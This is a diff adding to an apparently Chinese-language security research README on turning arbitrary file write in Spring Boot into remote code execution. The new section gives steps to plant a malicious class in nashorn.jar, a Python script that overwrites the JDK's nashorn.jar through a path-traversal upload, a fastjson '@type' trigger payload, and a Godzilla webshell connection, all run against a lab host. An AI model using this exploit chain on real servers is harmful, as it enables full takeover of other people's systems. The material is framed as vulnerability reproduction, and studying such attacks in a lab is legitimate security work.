@@ -1,3 +1,9 @@
+# Springboot任意文件写入RCE探索
+
+SpringFileWriteRCE为漏洞环境，包含upload, fastjson和aspectJ反序列化场景，启动服务前先创建uploads目录 mkdir /tmp/uploads
+
+## charsets.jar
+
 **概述**
 
 原作者：https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks
@@ -39,8 +45,6 @@ public class IBM33722 {
 }
 ```
 
-SpringFileWriteRCE为漏洞环境，包含upload和aspectJ反序列化场景
-
 **复现**
 
 将漏洞环境打包好后进入容器启动项目
@@ -73,8 +77,92 @@ Accept: text/html;charset=GBK
 
 <img width="1872" height="824" alt="image-20260115155047491" src="https://github.com/user-attachments/assets/77fb1515-f482-4f7a-940d-8278d2c75537" />
 
-此时哥斯拉连接
+哥斯拉连接
 
 <img width="612" height="644" alt="image-20260115155112622" src="https://github.com/user-attachments/assets/2ad270af-a061-404c-a8a1-0bbe11a23122" />
 
+## nashorn.jar
 
+**构造步骤**
+
+1.备份并解压正常的nashorn.jar包，位于JAVA_HOME/jre/lib/ext/
+
+2.在nashorn\jdk\nashorn\tools\下创建Shell.java，代码如下，这里就直接用这位师傅的代码来修改一下了
+
+https://flowerwind.github.io/2025/02/28/%E5%88%86%E4%BA%AB%E4%B8%80%E6%AC%A1%E7%BB%84%E5%90%88%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8B%BF%E4%B8%8B%E7%9B%AE%E6%A0%87/
+
+3.将fastjson-1.2.83.jar和正常的nashorn.jar包放在解压出来的nashorn目录下，用于编译Shell.java
+
+```
+nashorn
+	--jdk
+	--META-INF
+	--fastjson-1.2.83.jar
+	--nashorn.jar
+```
+
+4.编译Shell.java
+
+windows
+
+```cmd
+javac -cp "fastjson-1.2.83.jar;nashorn.jar" jdk/nashorn/tools/Shell.java
+```
+
+linux
+
+```bash
+javac -cp "fastjson-1.2.83.jar:nashorn.jar" jdk/nashorn/tools/Shell.java
+```
+
+没有报错就算成功
+
+5.将恶意Shell.class重新打包进nashorn.jar
+
+```
+jar -uvf nashorn.jar jdk/nashorn/tools/Shell.class
+```
+
+最后使用fastjson触发即可
+
+```json
+{"@type":"jdk.nashorn.tools.Shell","javaCode":"xxx"}
+```
+
+**实验**
+
+docker启动服务
+
+<img width="1589" height="514" alt="image" src="https://github.com/user-attachments/assets/07d2ff6e-db4c-41ef-a5b5-e7ff7e2c1423" />
+
+用python上传恶意jar包，覆盖JAVA_HOME/jre/lib/ext/nashorn.jar
+
+```python
+import requests
+
+url = "http://192.168.239.139:8081/upload"
+
+#proxy = {'http': 'http://127.0.0.1:8080'}
+
+target_path = "../../usr/lib/jvm/jdk1.8.0_201/jre/lib/ext/nashorn.jar"
+
+with open(r"C:\Users\13903\Desktop\nashorn\nashorn.jar", "rb") as f:
+    files = {
+        'file': (target_path, f, 'application/octet-stream')
+    }
+    response = requests.post(url, files=files)
+
+print(response.text)
+```
+
+上传成功后，访问/json
+
+```
+{"@type":"jdk.nashorn.tools.Shell","javaCode":"xxx"}
+```
+
+<img width="1873" height="822" alt="image" src="https://github.com/user-attachments/assets/bc40ec66-4ea6-42cc-9caf-792d9f0022da" />
+
+哥斯拉连接
+
+<img width="1055" height="683" alt="image" src="https://github.com/user-attachments/assets/be2918f0-8d96-4956-8f06-d9060b8658f6" />
